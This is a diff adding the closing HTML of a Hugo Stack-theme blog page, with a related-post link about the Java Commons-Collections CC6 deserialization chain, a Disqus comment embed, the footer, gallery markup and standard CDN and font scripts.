+                        
+                        data-hash="md5-w3vwD/l05PIx5RKmM44yXg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">java反序列化之Commons-Collections-CC6链</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2024 - 
+        
+        2025 一个俗人
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.26.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<style>
+  @font-face {
+    font-family: '屏显臻宋';
+    src: url(https://gsygsr.github.io/font/%E5%B1%8F%E6%98%BE%E8%87%BB%E5%AE%8B.ttf) format('truetype');
+  }
+
+  :root {
+    --base-font-family: '屏显臻宋';
+    --code-font-family: '屏显臻宋';
+  }
+</style>
+    </body>
+</html>
